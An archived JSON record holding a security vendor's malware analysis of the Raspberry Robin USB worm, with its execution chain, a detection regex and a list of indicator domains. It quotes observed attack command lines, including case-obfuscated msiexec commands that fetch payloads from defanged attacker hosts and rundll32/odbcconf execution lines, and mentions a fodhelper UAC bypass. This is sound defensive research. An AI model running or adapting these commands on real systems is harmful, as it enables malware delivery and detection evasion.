{
    "id": "de836fa6-d8b6-4ac1-952e-51d2631c7685",
    "created_at": "2023-01-12T15:09:52.003134Z",
    "updated_at": "2025-03-27T02:05:52.455529Z",
    "deleted_at": null,
    "sha1_hash": "16ee5003cc46933839a14d53a354e8e713ef47d7",
    "title": "2022-08-09 - Raspberry Robin- Highly Evasive Worm Spreads over External Disks",
    "authors": "",
    "file_creation_date": "2022-09-01T10:13:56Z",
    "file_modification_date": "2022-09-01T10:13:56Z",
    "file_size": 672175,
    "plain_text": "# Raspberry Robin: Highly Evasive Worm Spreads over External Disks\n\n**[blogs.cisco.com/security/raspberry-robin-highly-evasive-worm-spreads-over-external-disks](https://blogs.cisco.com/security/raspberry-robin-highly-evasive-worm-spreads-over-external-disks)**\n\nOnur Mustafa Erdogan August 9, 2022\n\n## Introduction\n\nDuring our threat hunting exercises in recent months, we’ve started to observe a\ndistinguishing pattern of msiexec.exe usage across different endpoints. As we drilled down\nto individual assets, we found traces of a recently discovered malware called Raspberry\nRobin. The RedCanary Research Team first coined the name for this malware in their blog\npost, and Sekoia published a Flash Report about the activity under the name of QNAP\nWorm. Both articles offer great analysis of the malware’s behavior. Our findings support and\nenrich prior research on the topic.\n\n## Execution Chain\n\nRaspberry Robin is a worm that spreads over an external drive. After initial infection, it\ndownloads its payload through msiexec.exe from QNAP cloud accounts, executes its code\nthrough rundll32.exe, and establishes a command and control (C2) channel through TOR\nconnections.\n\n\n-----\n\nImage 1: Execution chain of Raspberry Robin\nLet’s walkthrough the steps of the kill-chain to see how this malware functions.\n\n## Delivery and Exploitation\n\nRaspberry Robin is delivered through infected external disks. Once attached, cmd.exe tries\nto execute commands from a file within that disk. This file is either a .lnk file or a file with a\nspecific naming pattern. Files with this pattern exhibit a 2 to 5 character name with an usually\nobscure extension, including .swy, .chk, .ico, .usb, .xml, and .cfg. Also, the attacker uses\nan excessive amount of whitespace/non printable characters and changing letter case to\navoid string matching detection techniques. Example command lines include:\n\nC:\\Windows\\System32\\cmd.exe [redacted whitespace/non printable characters]\n/RCmD<qjM.chK\nC:\\Windows\\System32\\cmd.exe [redacted whitespace/non printable characters]\n/rcMD<[external disk name].LNk:qk\nC:\\Windows\\System32\\cmd.exe [redacted whitespace/non printable characters] /v\n/c CMd<VsyWZ.ICO\nC:\\Windows\\System32\\cmd.exe [redacted whitespace/non printable characters] /R\nC:\\WINDOWS\\system32\\cmd.exe<Gne.Swy\n\nFile sample for delivery can be found in this URL:\n\nhttps://www.virustotal.com/gui/file/04c13e8b168b6f313745be4034db92bf725d47091a6985de\n9682b21588b8bcae/relations\n\nNext, we observe explorer.exe running with an obscure command line argument, spawned\nby a previous instance of cmd.exe. This obscure argument seems to take the name of an\ninfected external drive or .lnk file that was previously executed. Some of the samples had\nvalues including USB, USB DISK, or USB Drive, while some other samples had more\nspecific names. On every instance of explorer.exe we see that the adversary is changing\nthe letter case to avoid detection:\n\nExPLORer [redacted]\nexploREr [redacted]\nExplORER USB Drive\n\n\n-----\n\neXplorer USB DISK\n\n## Installation\n\nAfter delivery and initial execution, cmd.exe spawns msiexec.exe to download the\nRaspberry Robin payload. It uses -q or /q together with standard installation parameter to\noperate quietly. Once again, mixed case letters are used to bypass detection:\n\nmSIexeC -Q -IhTtP://NT3[.]XyZ:8080/[11 char long random string]/[computer\n**name]=[username]**\nmSIExEC /q /i HTTP://k6j[.]PW:8080/[11 char long random string]/[computer\n**name]=[username]**\nMSIExEC -q -I HTTP://6W[.]RE:8080/[11 char long random string]/[computer\n**name]=[username]**\nmSIExec /Q /IhTTP://0Dz[.]Me:8080/[11 char long random string]/[computer\n**name]=[username]**\nmsIexec /Q -i http://doem[.]Re:8080/[11 char long random string]/[computer name]?\n\n**[username]**\nMSieXEC -Q-ihtTp://aIj[.]HK:8080/[11 char long random string]/[computer name]?\n\n**[username]**\n\nAs you can see above, URLs used for payload download have a specific pattern. Domains\nuse 2 to 4 character names with obscure TLDs including .xyz, .hk, .info, .pw, .cx, .me, and\nmore. URL paths have a single directory with a random string 11 characters long, followed by\nhostname and the username of the victim. On network telemetry, we also observed the\n**Windows Installer user agent due to the usage of msiexec.exe. To detect Raspberry Robin**\nthrough its URL pattern, use this regex:\n\n^http[s]{0,1}\\:\\/\\/[a-zA-Z0-9]{2,4}\\.[a-zA-Z0-9]{2,6}\\:8080\\/[a-zA-Z0-9]+\\/.*?(?:-|\\=|\\?).*?$\n\nIf we look up the WHOIS information for given domains, we see domain registration dates\ngoing as far back as February 2015. We also see an increase on registered domains starting\nfrom September 2021, which aligns with initial observations of Raspberry Robin by our\npeers.\n\n**WHOIS Creation Date** **Count**\n\n12/9/2015 1\n\n… …\n\n10/8/2020 1\n\n11/14/2020 1\n\n\n-----\n\n7/3/2021 1\n\n7/26/2021 2\n\n9/11/2021 2\n\n9/23/2021 9\n\n9/24/2021 6\n\n9/26/2021 4\n\n9/27/2021 2\n\n11/9/2021 3\n\n11/10/2021 1\n\n11/18/2021 2\n\n11/21/2021 3\n\n12/11/2021 7\n\n12/31/2021 7\n\n1/17/2022 6\n\n1/30/2022 11\n\n1/31/2022 3\n\n4/17/2022 5\n\nTable 1: Distribution of domain creation dates over time\n\nAssociated domains have SSL certificates with the subject alternative name of\nq74243532.myqnapcloud.com, which points out the underlying QNAP cloud infra. Also, their\nURL scan results return login pages to QTS service of QNAP:\n\n\n-----\n\nImage 2: QNAP QTS login page from associated domains\nOnce the payload is downloaded, it is executed through various system binaries. First,\n**rundll32.exe uses the ShellExec_RunDLL function from shell32.dll to leverage system**\nbinaries such as msiexec.exe, odbcconf.exe, or control.exe. These binaries are used to\nexecute the payload stored in C:\\ProgramData\\[3 chars]\\\n\nC:\\WINDOWS\\system32\\rundll32.exe shell32.dll ShellExec_RunDLL\nC:\\WINDOWS\\syswow64\\MSIEXEC.EXE/FORCERESTART\nrfmda=HUFQMJFZWJSBPXH -NORESTART /QB -QR -y\nC:\\ProgramData\\Azu\\wnjdgz.vhbd. -passive /QR /PROMPTRESTART -QR -qb\n/forcerestart\nC:\\Windows\\system32\\RUNDLL32.EXE shell32.dll ShellExec_RunDLLA\nC:\\Windows\\syswow64\\odbcconf.exe -s -C -a {regsvr\nC:\\ProgramData\\Tvb\\zhixyye.lock.} /a {CONFIGSYSDSN wgdpb YNPMVSV} /A\n{CONFIGDSN dgye AVRAU pzzfvzpihrnyj}\nexe SHELL32,ShellExec_RunDLLA C:\\WINDOWS\\syswow64\\odbcconf -E /c /C -a\n{regsvr C:\\ProgramData\\Euo\\ikdvnbb.xml.}\nC:\\WINDOWS\\system32\\rundll32.exe SHELL32,ShellExec_RunDLL\nC:\\WINDOWS\\syswow64\\CONTROL.EXE C:\\ProgramData\\Lzm\\qkuiht.lkg.\n\nIt is followed by the execution of fodhelper.exe, which has the auto elevated bit set to true. It\nis often leveraged by adversaries in order to bypass User Account Control and execute\nadditional commands with escalated privileges [3]. To monitor suspicious executions of\n**fodhelper.exe, we suggest monitoring its instances without any command line arguments.**\n\n## Command and Control\n\nRaspberry Robin sets up its C2 channel through the additional execution of system binaries\nwithout any command line argument, which is quite unusual. That likely points to process\ninjection given elevated privileges in previous steps of execution. It uses dllhost.exe,\n**rundll32.exe, and regsvr32.exe to set up a TOR connection.**\n\n\n-----\n\n## Detection through Global Threat Alerts\n\n[In Cisco Global Threat Alerts available through Cisco Secure Network Analytics and Cisco](https://www.cisco.com/c/en/us/td/docs/security/stealthwatch/global-threat-alerts-in-secure-network-analytics/m_dashboard.html)\n[Secure Endpoint, we track this activity under the](https://www.cisco.com/c/en/us/td/docs/security/amp/endpoints/global-threat-alerts-in-secure-endpoint.html) [Raspberry Robin threat object. Image 3](https://cta.eu.amp.cisco.com/ui/threats/22f61d9b-1ef2-4f3e-9c24-1f2f51316c44)\nshows a detection sample of Raspberry Robin:\n\nImage 3: Raspberry Robin detection sample in Cisco Global Threat Alerts\n\n## Conclusion\n\nRaspberry Robin tries to remain undetected through its use of system binaries, mixed letter\ncase, TOR-based C2, and abuse of compromised QNAP accounts. Although we have similar\nintelligence gaps (how it infects external disks, what are its actions on objective) like our\npeers, we are continuously observing its activities.\n\n## Indicators of Compromise\n\n**Type** **Stage** **IOC**\n\nDomain Payload Delivery k6j[.]pw\n\nDomain Payload Delivery kjaj[.]top\n\nDomain Payload Delivery v0[.]cx\n\nDomain Payload Delivery zk4[.]me\n\nDomain Payload Delivery zk5[.]co\n\nDomain Payload Delivery 0dz[.]me\n\nDomain Payload Delivery 0e[.]si\n\nDomain Payload Delivery 5qw[.]pw\n\nDomain Payload Delivery 6w[.]re\n\nDomain Payload Delivery 6xj[.]xyz\n\nDomain Payload Delivery aij[.]hk\n\n\n-----\n\nDomain Payload Delivery b9[.]pm\n\nDomain Payload Delivery glnj[.]nl\n\nDomain Payload Delivery j4r[.]xyz\n\nDomain Payload Delivery j68[.]info\n\nDomain Payload Delivery j8[.]si\n\nDomain Payload Delivery jjl[.]one\n\nDomain Payload Delivery jzm[.]pw\n\nDomain Payload Delivery k6c[.]org\n\nDomain Payload Delivery kj1[.]xyz\n\nDomain Payload Delivery kr4[.]xyz\n\nDomain Payload Delivery l9b[.]org\n\nDomain Payload Delivery lwip[.]re\n\nDomain Payload Delivery mzjc[.]is\n\nDomain Payload Delivery nt3[.]xyz\n\nDomain Payload Delivery qmpo[.]art\n\nDomain Payload Delivery tiua[.]uk\n\nDomain Payload Delivery vn6[.]co\n\nDomain Payload Delivery z7s[.]org\n\nDomain Payload Delivery k5x[.]xyz\n\nDomain Payload Delivery 6Y[.]rE\n\nDomain Payload Delivery doem[.]Re\n\nDomain Payload Delivery bpyo[.]IN\n\nDomain Payload Delivery l5k[.]xYZ\n\nDomain Payload Delivery uQW[.]fUTbOL\n\nDomain Payload Delivery t7[.]Nz\n\nDomain Payload Delivery 0t[.]yT\n\n\n-----\n\n## References\n\n[1. Raspberry Robin gets the worm early – https://redcanary.com/blog/raspberry-robin/](https://redcanary.com/blog/raspberry-robin/)\n2. QNAP worm: who benefits from crime? – https://7095517.fs1.hubspotusercontent\n[na1.net/hubfs/7095517/FLINT%202022-016%20-](https://7095517.fs1.hubspotusercontent-na1.net/hubfs/7095517/FLINT%202022-016%20-%20QNAP%20worm_%20who%20benefits%20from%20crime%20(1).pdf)\n%20QNAP%20worm_%20who%20benefits%20from%20crime%20(1).pdf\n[3. UAC Bypass – Fodhelper – https://pentestlab.blog/2017/06/07/uac-bypass-fodhelper/](https://pentestlab.blog/2017/06/07/uac-bypass-fodhelper/)\n\nShare:\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-08-09 - Raspberry Robin- Highly Evasive Worm Spreads over External Disks.pdf"
    ],
    "report_names": [
        "2022-08-09 - Raspberry Robin- Highly Evasive Worm Spreads over External Disks.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673536192,
    "ts_updated_at": 1743041152,
    "ts_creation_date": 1662027236,
    "ts_modification_date": 1662027236,
    "files": {
        "pdf": "https://archive.orkl.eu/16ee5003cc46933839a14d53a354e8e713ef47d7.pdf",
        "text": "https://archive.orkl.eu/16ee5003cc46933839a14d53a354e8e713ef47d7.txt",
        "img": "https://archive.orkl.eu/16ee5003cc46933839a14d53a354e8e713ef47d7.jpg"
    }
}